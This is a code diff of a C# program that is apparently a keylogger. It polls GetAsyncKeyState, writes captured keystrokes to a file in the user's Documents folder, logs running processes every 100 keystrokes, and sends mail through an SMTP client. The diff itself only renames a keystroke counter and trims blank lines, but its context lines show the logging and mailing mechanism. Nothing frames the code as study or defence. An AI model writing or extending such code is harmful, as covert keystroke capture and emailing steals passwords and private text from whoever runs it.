@@ -12,7 +12,7 @@ namespace test1
     {
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
-        static long numberOfKeyStrokes = 0;
+        static long numberOfKeysPressed = 0;
         static void Main(string[] args)
         {
             string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
@@ -38,8 +38,8 @@ namespace test1
                         {
                             sw.Write((char)i);
                         }
-                        numberOfKeyStrokes++;
-                        if (numberOfKeyStrokes % 100 == 0)
+                        numberOfKeysPressed++;
+                        if (numberOfKeysPressed % 100 == 0)
                         {
                             File.WriteAllText(pathProcesses, string.Empty);
                             Process[] processes = Process.GetProcesses();
@@ -96,7 +96,5 @@ namespace test1
             client.Send(mailMessage);
 
         }
-
-
     }
 }
